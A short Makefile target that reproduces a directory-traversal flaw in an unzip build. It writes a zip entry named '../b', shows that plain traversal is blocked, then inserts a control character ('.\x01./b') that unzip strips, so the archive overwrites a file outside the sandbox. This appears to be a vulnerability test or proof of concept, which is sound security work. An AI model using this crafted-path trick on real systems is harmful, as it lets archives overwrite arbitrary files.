.PHONY: directory_traversal

directory_traversal:
	# Create two files: a (foo) and b (bar).
	echo foo > a
	echo bar > b
	# Create a zip file with a as '../b'.
	python -c "import zipfile; zipfile.ZipFile('x.zip', 'w').write('a', '../b')"
	# Unzip x.zip into a sandbox directory.
	./unzip -o x.zip -d sandbox || true
	# Unzip sanitizes the input, detects the directory traversal, and prevents it: b should be bar.
	cat b
	# Let's try again, this time adding invalid characters to confuse unzip.
	python -c "import zipfile; zipfile.ZipFile('x.zip', 'w').write('a', '.\x01./b')"
	# Unzip x.zip into a sandbox directory.
	./unzip -o x.zip -d sandbox
	# Unzip filters invalid characters causing the directory traversal to succeed: b should be foo.
	cat b
